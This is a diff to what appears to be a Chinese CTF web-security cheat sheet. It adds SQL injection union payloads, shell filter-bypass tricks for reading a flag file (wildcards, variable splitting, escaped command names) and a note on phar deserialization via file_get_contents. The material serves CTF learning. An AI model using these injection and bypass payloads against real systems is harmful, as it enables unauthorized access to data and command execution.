@@ -519,13 +519,21 @@ $sql = "select username,password from user where username !='flag' and id = '".$
 1' union select 1,2,3%23
 ```
 
-如果网站只显示返回数据的第一行内容，可以尝试
+**另外**，如果网站只显示返回数据的第一行内容，可以尝试
 
 ```sql
 ' union select 1,2,3%23
 ```
 
 这样 union 后查询到的内容就变成了第一行
+
+**另外**，如果网站只显示返回数据的第一行内容，且网站是整属型注入，可以尝试
+
+```sql
+0 union select 1,2,3%23
+```
+
+把 1 改成 0 后，第一行的内容就查询不到，自然就会显示第二行内容
 
 ###### 测试第三列能否显示 database()
 
@@ -781,6 +789,8 @@ SELECT * FROM users WHERE username='vampire     ';
   当 `cat` 被绕过，用 `tac` 替代【还有 more、less、head、tail、nl、sed、sort、uniq、rev 等】
 
   `ls` 可用 `dir`、`l's'`、`l\s` 替代（如果遇到其他命令被过滤，也可以像这样用 `'` 或 `\` 来绕过）【 `cat` 用 `c\at` 替代，而不是 `ca\t` ，因为 `\t` 是 `tab` 的转义字符。也可以使用 `c''at`、`c""at` 绕过】
+
+  `flag` 绕过: `f*`、` fl?g`、` [e-g]lag`, `a=fl;b=ag;cat $a$b`
 
   用 `+` 代替空格
 
@@ -1763,7 +1773,7 @@ O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
 
 ##### 反序列化 phar
 
-- 抓住突破口 `file_get_contents`，只要有该函数就可以触发 phar 中的内容执行
+- 抓住突破口 `echo file_get_contents`，会触发 phar 中的内容执行
 
 例题:
 
